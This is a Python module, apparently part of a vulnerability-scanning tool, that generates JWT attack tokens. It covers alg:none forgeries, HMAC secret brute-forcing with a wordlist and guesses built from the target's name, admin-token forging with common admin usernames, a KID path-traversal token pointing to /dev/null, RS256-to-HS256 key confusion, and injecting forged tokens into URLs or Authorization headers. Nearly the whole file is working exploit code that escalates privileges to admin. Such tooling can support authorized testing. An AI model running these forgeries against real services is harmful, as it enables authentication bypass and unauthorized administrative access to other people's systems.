"""
JWT Attacks - Pure Functions

Pure functions for JWT attack payload generation: alg:none, key confusion,
weak secret dictionary, KID injection, and token forging.

All functions are PURE: no side effects, no self, data as parameters.
"""

import json
import base64
import hmac
import hashlib
import datetime
from typing import Dict, List, Optional, Tuple

from bugtrace.agents.jwt.types import ALG_NONE_VARIANTS, ADMIN_NAMES
from bugtrace.agents.jwt.analysis import base64url_decode


# =========================================================================
# None Algorithm Attack Payloads (PURE)
# =========================================================================

def none_alg_decode_header(parts: List[str]) -> Optional[Dict]:
    """Decode JWT header for none algorithm attack.

    Args:
        parts: JWT split by '.'

    Returns:
        Header dict or None on failure
    """  # PURE
    try:
        return json.loads(base64url_decode(parts[0]))
    except (json.JSONDecodeError, ValueError, TypeError):
        return None


def none_alg_build_payload(parts: List[str]) -> str:
    """Build elevated privilege payload for none algorithm attack.

    Args:
        parts: JWT split by '.'

    Returns:
        Base64url-encoded payload string
    """  # PURE
    try:
        payload = json.loads(base64url_decode(parts[1]))
        payload['admin'] = True
        payload['role'] = 'admin'
        p_json = json.dumps(payload, separators=(',', ':')).encode()
        return base64.urlsafe_b64encode(p_json).decode().strip('=')
    except Exception:
        return parts[1]  # Fallback to original


def build_none_alg_token_with_dot(alg: str, header: Dict, parts: List[str]) -> str:
    """Build a none-algorithm token with trailing dot format.

    Args:
        alg: Algorithm variant string (e.g., 'none', 'None', 'NONE')
        header: Original header dict
        parts: Original JWT split by '.'

    Returns:
        Forged token string
    """  # PURE
    new_header = header.copy()
    new_header['alg'] = alg

    h_json = json.dumps(new_header, separators=(',', ':')).encode()
    h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')
    p_b64 = none_alg_build_payload(parts)

    return f"{h_b64}.{p_b64}."


def build_none_alg_token_without_dot(alg: str, header: Dict, parts: List[str]) -> str:
    """Build a none-algorithm token without trailing dot.

    Args:
        alg: Algorithm variant string
        header: Original header dict
        parts: Original JWT split by '.'

    Returns:
        Forged token string
    """  # PURE
    new_header = header.copy()
    new_header['alg'] = alg

    h_json = json.dumps(new_header, separators=(',', ':')).encode()
    h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')
    p_b64 = none_alg_build_payload(parts)

    return f"{h_b64}.{p_b64}"


def generate_none_alg_tokens(header: Dict, parts: List[str]) -> List[Tuple[str, str, str]]:
    """Generate all none-algorithm attack token variants.

    Args:
        header: Original JWT header dict
        parts: Original JWT split by '.'

    Returns:
        List of (forged_token, alg_variant, format_description) tuples
    """  # PURE
    tokens = []
    for alg in ALG_NONE_VARIANTS:
        tokens.append((
            build_none_alg_token_with_dot(alg, header, parts),
            alg,
            "with_dot",
        ))
        tokens.append((
            build_none_alg_token_without_dot(alg, header, parts),
            alg,
            "without_dot",
        ))
    return tokens


# =========================================================================
# Brute Force / Weak Secret Payloads (PURE)
# =========================================================================

def prepare_brute_force(parts: List[str]) -> Tuple[bytes, Optional[bytes]]:
    """Prepare signing input and actual signature for brute force.

    Args:
        parts: JWT split by '.'

    Returns:
        Tuple of (signing_input_bytes, signature_bytes_or_None)
    """  # PURE
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        signature_actual = base64.urlsafe_b64decode(parts[2] + "==")
        return signing_input, signature_actual
    except (ValueError, TypeError):
        return signing_input, None


def test_secret(signing_input: bytes, signature_actual: bytes, secret: str) -> bool:
    """Test if a secret matches the JWT signature.

    Args:
        signing_input: The header.payload bytes
        signature_actual: The actual signature bytes
        secret: The candidate secret string

    Returns:
        True if the secret produces the correct signature
    """  # PURE
    h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
    return h.digest() == signature_actual


def load_jwt_wordlist(wordlist_path, url: str = "", extra_names: List[str] = None) -> List[str]:
    """Load JWT secret wordlist from file + generate target-specific patterns.

    Args:
        wordlist_path: Path to jwt_secrets.txt file
        url: Target URL for extracting names
        extra_names: Additional app names to generate patterns from

    Returns:
        List of secret candidates (target-specific first, then generic)
    """  # PURE (file read is idempotent)
    from bugtrace.agents.jwt.analysis import extract_target_names

    try:
        with open(wordlist_path, 'r') as f:
            wordlist = [
                line.strip()
                for line in f
                if line.strip() and not line.strip().startswith('#')
            ]
    except Exception:
        wordlist = [
            "secret", "password", "123456", "jwt", "key",
            "auth", "admin", "token", "1234567890", "mysupersecret",
        ]

    all_names = []
    if url:
        all_names = extract_target_names(url)
    if extra_names:
        all_names = list(set(all_names + extra_names))

    if all_names:
        dynamic_secrets = generate_name_based_secrets(all_names)
        if dynamic_secrets:
            wordlist = dynamic_secrets + wordlist  # Target-specific first

    return wordlist


def generate_name_based_secrets(names: List[str]) -> List[str]:
    """Generate common secret patterns from extracted app names.

    Args:
        names: List of app name strings

    Returns:
        List of generated secret candidates
    """  # PURE
    current_year = datetime.datetime.now().year
    years = [str(current_year), str(current_year - 1), str(current_year - 2)]

    suffixes = [
        "_secret", "-secret", "secret",
        "_key", "-key", "key",
        "_jwt", "-jwt",
        "_token", "-token",
        "_api", "-api",
        "123", "_123",
    ]

    secrets = []
    for name in names:
        # Direct name
        secrets.append(name)

        # name + suffix
        for suffix in suffixes:
            secrets.append(f"{name}{suffix}")

        # name + suffix + year
        for suffix in ["_secret_", "-secret-", "_key_", "_secret", "_jwt_"]:
            for year in years:
                secrets.append(f"{name}{suffix}{year}")

        # name + year
        for year in years:
            secrets.append(f"{name}_{year}")
            secrets.append(f"{name}{year}")

    return secrets


# =========================================================================
# Token Forging (PURE)
# =========================================================================

def sign_forged_payload(payload: Dict, header_b64: str, secret: str) -> str:
    """Sign a forged JWT payload with a known secret.

    Args:
        payload: JWT payload dict
        header_b64: Base64url-encoded header string
        secret: Signing secret string

    Returns:
        Complete forged JWT string
    """  # PURE
    p_json = json.dumps(payload, separators=(',', ':')).encode()
    p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

    new_signing_input = f"{header_b64}.{p_b64}".encode()
    new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
    new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')

    return f"{header_b64}.{p_b64}.{new_sig_b64}"


def forge_admin_token_variations(decoded: Dict, parts: List[str], secret: str) -> List[Tuple[str, str]]:
    """Forge multiple admin JWT token variations with different sub/username claims.

    Most apps use 'sub' to look up the user in the DB, then check the DB role.
    Simply adding role='admin' to the JWT doesn't work if the DB user isn't admin.
    We try common admin usernames as 'sub' to match real admin accounts.

    Args:
        decoded: Decoded JWT dict (from decode_token)
        parts: Original JWT split by '.'
        secret: Cracked secret string

    Returns:
        List of (token_string, description) tuples
    """  # PURE
    variations = []
    original_sub = decoded['payload'].get('sub', '')

    # Variations 1-3: common admin usernames as sub
    for admin_name in ADMIN_NAMES:
        if admin_name == original_sub:
            continue
        v = decoded['payload'].copy()
        v['admin'] = True
        v['role'] = 'admin'
        v['sub'] = admin_name
        if 'user' in v:
            v['user'] = admin_name
        if 'username' in v:
            v['username'] = admin_name
        variations.append((sign_forged_payload(v, parts[0], secret), f"sub='{admin_name}'"))

    # Variation 4: original sub + admin claims
    v1 = decoded['payload'].copy()
    v1['admin'] = True
    v1['role'] = 'admin'
    if 'user' in v1:
        v1['user'] = 'admin'
    variations.append((sign_forged_payload(v1, parts[0], secret), f"original sub='{original_sub}' + admin claims"))

    # Variation 5: numeric sub=1 (first user is often admin)
    if original_sub not in ('1', 1):
        v = decoded['payload'].copy()
        v['admin'] = True
        v['role'] = 'admin'
        v['sub'] = 1
        variations.append((sign_forged_payload(v, parts[0], secret), "sub=1 (numeric admin)"))

    return variations


# =========================================================================
# KID Injection Payloads (PURE)
# =========================================================================

def build_kid_injection_token(decoded: Dict, token: str) -> str:
    """Build a KID injection token with directory traversal to /dev/null.

    Args:
        decoded: Decoded JWT dict
        token: Original JWT string

    Returns:
        Forged JWT string signed with empty key
    """  # PURE
    new_header = decoded['header'].copy()
    new_header['kid'] = "../../../../../../../dev/null"

    h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().strip('=')
    p_b64 = token.split('.')[1]

    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')

    return f"{h_b64}.{p_b64}.{sig_b64}"


# =========================================================================
# Key Confusion Attack Payloads (PURE)
# =========================================================================

def forge_key_confusion_token(pub_key_pem: bytes, decoded: Dict) -> str:
    """Forge JWT using public key as HMAC secret (RS256 -> HS256 confusion).

    Args:
        pub_key_pem: Public key in PEM format (bytes)
        decoded: Decoded JWT dict

    Returns:
        Forged JWT string
    """  # PURE
    # Build header
    new_header = decoded['header'].copy()
    new_header['alg'] = 'HS256'
    h_b64 = base64.urlsafe_b64encode(
        json.dumps(new_header, separators=(',', ':')).encode()
    ).decode().strip('=')

    # Build payload with elevated privileges
    new_payload = decoded['payload'].copy()
    new_payload['role'] = 'admin'
    new_payload['admin'] = True
    p_json = json.dumps(new_payload, separators=(',', ':')).encode()
    p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

    # Sign with public key as HMAC secret
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')

    return f"{h_b64}.{p_b64}.{sig_b64}"


# =========================================================================
# Token URL Injection (PURE)
# =========================================================================

def inject_token_into_url_param(target_url: str, token: str, loc: str, headers: Dict) -> Tuple[str, Dict]:
    """Inject token into URL parameter.

    Args:
        target_url: Target URL
        token: JWT token string
        loc: Location type ("param", "manual", etc.)
        headers: HTTP headers dict

    Returns:
        Tuple of (final_url, updated_headers)
    """  # PURE
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

    p = urlparse(target_url)
    qs = parse_qs(p.query)

    found_param = False
    for k, v in qs.items():
        if any(is_jwt_like(val) for val in v):
            qs[k] = [token]
            found_param = True

    if not found_param and loc == "manual":
        qs["token"] = [token]

    new_query = urlencode(qs, doseq=True)
    final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))

    # Fallback for manual: also try as a header
    if loc == "manual" and not found_param:
        headers = {**headers, "Authorization": f"Bearer {token}"}

    return final_url, headers


def is_jwt_like(token: str) -> bool:
    """Check if a string looks like a JWT (alias for is_jwt)."""  # PURE
    parts = token.split('.')
    return len(parts) == 3 and all(len(p) > 4 for p in parts[:2])


__all__ = [
    "none_alg_decode_header",
    "none_alg_build_payload",
    "build_none_alg_token_with_dot",
    "build_none_alg_token_without_dot",
    "generate_none_alg_tokens",
    "prepare_brute_force",
    "test_secret",
    "load_jwt_wordlist",
    "generate_name_based_secrets",
    "sign_forged_payload",
    "forge_admin_token_variations",
    "build_kid_injection_token",
    "forge_key_confusion_token",
    "inject_token_into_url_param",
]
